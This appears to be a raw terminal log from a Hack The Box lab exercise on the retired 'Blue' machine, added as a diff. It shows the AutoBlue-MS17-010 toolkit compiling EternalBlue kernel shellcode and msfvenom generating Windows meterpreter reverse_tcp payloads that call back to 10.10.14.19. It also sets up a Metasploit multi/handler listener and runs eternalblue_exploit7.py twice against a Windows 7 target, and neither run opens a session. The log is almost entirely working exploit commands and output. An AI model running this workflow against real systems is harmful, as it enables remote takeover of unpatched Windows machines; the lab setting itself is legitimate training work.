+Compiling x64 kernel shellcode                         
+Compiling x86 kernel shellcode                         
+kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)                
+y                          
+LHOST for reverse connection:                          
+10.10.10.14.19             
+LPORT you want x64 to listen on:                       
+9005                       
+LPORT you want x86 to listen on:                       
+9005                       
+Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell                                    
+0                          
+Type 0 to generate a staged payload or 1 to generate a stageless payload                                       
+0                          
+Generating x64 meterpreter shell (staged)...           
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.10.10.14.19 LPORT=9005                  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                         
+[-] No arch selected, selecting arch: x64 from the payload                                                     
+Error: The following options failed to validate: LHOST.                                                        
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010/shellcode$ sudo ./shell_prep.sh               
+                 _.-;;-._  
+          '-..-'|   ||   | 
+          '-..-'|_.-;;-._| 
+          '-..-'|   ||   | 
+          '-..-'|_.-''-._|                             
+Eternal Blue Windows Shellcode Compiler                
+
+Let's compile them windoos shellcodezzz                
+
+Compiling x64 kernel shellcode                         
+Compiling x86 kernel shellcode                         
+kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)                
+y                          
+LHOST for reverse connection:                          
+10.10.14.19                
+LPORT you want x64 to listen on:                       
+9005                       
+LPORT you want x86 to listen on:                       
+9005                       
+Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell                                    
+0                          
+Type 0 to generate a staged payload or 1 to generate a stageless payload                                       
+0                          
+Generating x64 meterpreter shell (staged)...           
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.10.14.19 LPORT=9005                     
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                         
+[-] No arch selected, selecting arch: x64 from the payload                                                     
+No encoder or badchars specified, outputting raw payload                                                       
+Payload size: 511 bytes    
+Saved as: sc_x64_msf.bin   
+
+Generating x86 meterpreter shell (staged)...           
+
+msfvenom -p windows/meterpreter/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.10.14.19 LPORT=9005                         
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                         
+[-] No arch selected, selecting arch: x86 from the payload                                                     
+No encoder or badchars specified, outputting raw payload                                                       
+Payload size: 362 bytes    
+Saved as: sc_x86_msf.bin   
+
+MERGING SHELLCODE WOOOO!!! 
+DONE                       
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010/shellcode$ cd ..                              
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ sudo ./listener_prep.sh                      
+  __                       
+  /,-                      
+  ||)                      
+  \\_, )                   
+   `--'                    
+Enternal Blue Metasploit Listener                      
+
+LHOST for reverse connection:                          
+10.10.14.19                
+LPORT for x64 reverse connection:                      
+9005                       
+LPORT for x86 reverse connection:                      
+9005                       
+Enter 0 for meterpreter shell or 1 for regular cmd shell:                                                      
+0                          
+Type 0 if this is a staged payload or 1 if it is for a stageless payload                                       
+0                          
+Starting listener (staged)...                          
+Starting postgresql (via systemctl): postgresql.service.                                                       
+[-] ***rting the Metasploit Framework console...-      
+[-] * WARNING: No database support: No database YAML file                                                      
+[-] ***                    
+                                                       
+
+     .~+P``````-o+:.                                      -o+:.                                                
+.+oooyysyyssyyssyddh++os-`````                        ```````````````          `                               
++++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o                                
+++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy                               
+--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///                                
+                                `...............`              `...-/////...`                                  
+
+
+                                  .::::::::::-.                     .::::::-                                   
+                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo                                  
+                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&&MMMMMMMMMMMMMMy                                  
+                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMMh`                                  
+                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMh`                                   
+                                   -Nh` .yMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMm/                                    
+    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMm/                                     
+      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMd                                      
+    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/                                      
+    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:                                      
+          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+                                     
+          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::                                      
+          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||                                        
+........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........                                
+================================================================================                               
+=====================+--------------------------------+=========================                               
+=====================| Session one died of dysentery. |=========================                               
+=====================+--------------------------------+=========================                               
+================================================================================                               
+
+                     Press ENTER to size up the situation                                                      
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                               
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%                               
+%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%                               
+%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                               
+%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                               
+%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%                               
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                               
+
+                        Press SPACE BAR to continue    
+
+
+
+       =[ metasploit v5.0.76-dev                          ]                                                    
++ -- --=[ 1971 exploits - 1088 auxiliary - 339 post       ]                                                    
++ -- --=[ 558 payloads - 45 encoders - 10 nops            ]                                                    
++ -- --=[ 7 evasion                                       ]                                                    
+
+[*] Processing config.rc for ERB directives.           
+resource (config.rc)> use exploit/multi/handler        
+resource (config.rc)> set PAYLOAD windows/x64/meterpreter/reverse_tcp                                          
+PAYLOAD => windows/x64/meterpreter/reverse_tcp         
+resource (config.rc)> set LHOST 10.10.14.19            
+LHOST => 10.10.14.19       
+resource (config.rc)> set LPORT 9005                   
+LPORT => 9005              
+resource (config.rc)> set ExitOnSession false          
+ExitOnSession => false     
+resource (config.rc)> set EXITFUNC thread              
+EXITFUNC => thread         
+resource (config.rc)> exploit -j                       
+[*] Exploit running as background job 0.               
+[*] Exploit completed, but no session was created.     
+resource (config.rc)> set PAYLOAD windows/meterpreter/reverse_tcp                                              
+PAYLOAD => windows/meterpreter/reverse_tcp             
+resource (config.rc)> set LPORT 9005                   
+LPORT => 9005              
+resource (config.rc)> exploit -j                       
+[*] Exploit running as background job 1.               
+[*] Exploit completed, but no session was created.     
+[*] Started reverse TCP handler on 10.10.14.19:9005    
+
+[-] Handler failed to bind to 10.10.14.19:9005:-  -    
+[-] Handler failed to bind to 0.0.0.0:9005:-  -        
+[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:9005). 
+msf5 exploit(multi/handler) > exit                     
+Stopping postgresql (via systemctl): postgresql.service.                                                       
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ cd shellcode/                                
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010/shellcode$ sudo ./shell_prep.sh               
+                 _.-;;-._  
+          '-..-'|   ||   | 
+          '-..-'|_.-;;-._| 
+          '-..-'|   ||   | 
+          '-..-'|_.-''-._|                             
+Eternal Blue Windows Shellcode Compiler                
+
+Let's compile them windoos shellcodezzz                
+
+Compiling x64 kernel shellcode                         
+Compiling x86 kernel shellcode                         
+kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)                
+y                          
+LHOST for reverse connection:                          
+10.10.14.19                
+LPORT you want x64 to listen on:                       
+9008                       
+LPORT you want x86 to listen on:                       
+9009                       
+Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell                                    
+0                          
+Type 0 to generate a staged payload or 1 to generate a stageless payload                                       
+0                          
+Generating x64 meterpreter shell (staged)...           
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.10.14.19 LPORT=9008                     
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                         
+[-] No arch selected, selecting arch: x64 from the payload                                                     
+No encoder or badchars specified, outputting raw payload                                                       
+Payload size: 511 bytes    
+Saved as: sc_x64_msf.bin   
+
+Generating x86 meterpreter shell (staged)...           
+
+msfvenom -p windows/meterpreter/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.10.14.19 LPORT=9009                         
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                         
+[-] No arch selected, selecting arch: x86 from the payload                                                     
+No encoder or badchars specified, outputting raw payload                                                       
+Payload size: 362 bytes    
+Saved as: sc_x86_msf.bin   
+
+MERGING SHELLCODE WOOOO!!! 
+DONE                       
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010/shellcode$ cd ..                              
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ sudo ./listener_prep.sh                      
+  __                       
+  /,-                      
+  ||)                      
+  \\_, )                   
+   `--'                    
+Enternal Blue Metasploit Listener                      
+
+LHOST for reverse connection:                          
+10.10.14.19                
+LPORT for x64 reverse connection:                      
+9008                       
+LPORT for x86 reverse connection:                      
+9009                       
+Enter 0 for meterpreter shell or 1 for regular cmd shell:                                                      
+0                          
+Type 0 if this is a staged payload or 1 if it is for a stageless payload                                       
+0                          
+Starting listener (staged)...                          
+Starting postgresql (via systemctl): postgresql.service.                                                       
+[-] ***rting the Metasploit Framework console...-      
+[-] * WARNING: No database support: No database YAML file                                                      
+[-] ***                    
+                                                       
+                                   ____________        
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                
+ [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]                                
+ [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]                                
+ [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]                                
+ [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]                                
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]                                
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                
+
+
+       =[ metasploit v5.0.76-dev                          ]                                                    
++ -- --=[ 1971 exploits - 1088 auxiliary - 339 post       ]                                                    
++ -- --=[ 558 payloads - 45 encoders - 10 nops            ]                                                    
++ -- --=[ 7 evasion                                       ]                                                    
+
+[*] Processing config.rc for ERB directives.           
+resource (config.rc)> use exploit/multi/handler        
+resource (config.rc)> set PAYLOAD windows/x64/meterpreter/reverse_tcp                                          
+PAYLOAD => windows/x64/meterpreter/reverse_tcp         
+resource (config.rc)> set LHOST 10.10.14.19            
+LHOST => 10.10.14.19       
+resource (config.rc)> set LPORT 9008                   
+LPORT => 9008              
+resource (config.rc)> set ExitOnSession false          
+ExitOnSession => false     
+resource (config.rc)> set EXITFUNC thread              
+EXITFUNC => thread         
+resource (config.rc)> exploit -j                       
+[*] Exploit running as background job 0.               
+[*] Exploit completed, but no session was created.     
+resource (config.rc)> set PAYLOAD windows/meterpreter/reverse_tcp                                              
+PAYLOAD => windows/meterpreter/reverse_tcp             
+resource (config.rc)> set LPORT 9009                   
+LPORT => 9009              
+resource (config.rc)> exploit -j                       
+[*] Started reverse TCP handler on 10.10.14.19:9008    
+[*] Exploit running as background job 1.               
+[*] Exploit completed, but no session was created.     
+
+[*] Started reverse TCP handler on 10.10.14.19:9009    
+msf5 exploit(multi/handler) > ls                                                                               
+[*] exec: ls               
+
+config.rc                 eternalblue_exploit8.py  listener_prep.sh  shellcode                                 
+eternalblue_exploit10.py  eternal_checker.py       mysmb.py          zzz_exploit.py                            
+eternalblue_exploit7.py   LICENSE                  README.md                                                   
+msf5 exploit(multi/handler) > exit                     
+Stopping postgresql (via systemctl): postgresql.service.                                                       
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ ls                                           
+eternalblue_exploit10.py  eternalblue_exploit8.py  LICENSE           mysmb.py   shellcode                      
+eternalblue_exploit7.py   eternal_checker.py       listener_prep.sh  README.md  zzz_exploit.py                 
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ python eternalblue_exploit7.py 10.10.10.40 shellcode/sc_all.bin         
+shellcode size: 2292       
+numGroomConn: 13           
+Target OS: Windows 7 Professional 7601 Service Pack 1  
+SMB1 session setup allocate nonpaged pool success      
+SMB1 session setup allocate nonpaged pool success      
+good response status: INVALID_PARAMETER                
+done                       
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$ python eternalblue_exploit7.py 10.10.10.40 shellcode/sc_all.bin         
+shellcode size: 2292       
+numGroomConn: 13           
+Target OS: Windows 7 Professional 7601 Service Pack 1  
+SMB1 session setup allocate nonpaged pool success      
+SMB1 session setup allocate nonpaged pool success      
+good response status: INVALID_PARAMETER                
+done                       
+arjun@kali:~/Documents/HackTheBox/retired/blue/AutoBlue-MS17-010$                                              
